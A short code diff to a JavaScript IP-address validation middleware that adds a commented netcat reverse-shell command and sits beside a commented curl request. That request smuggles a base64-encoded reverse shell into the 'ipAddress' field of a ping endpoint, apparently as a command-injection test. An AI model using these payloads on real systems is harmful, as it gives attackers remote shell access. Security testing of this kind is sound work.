@@ -27,5 +27,5 @@ const validateIpAddress = (req, res, next) => {
   
 export default validateIpAddress;
 
-
+// nc 192.168.10.35 12345 -e sh
 // curl -X POST -H "Content-Type: application/json" -d '{"ipAddress": "I.dont.Exist||echo${IFS}<base64_reverse_shell>|base64${IFS}-d|bash"}' http://192.168.1.130:5000/ping
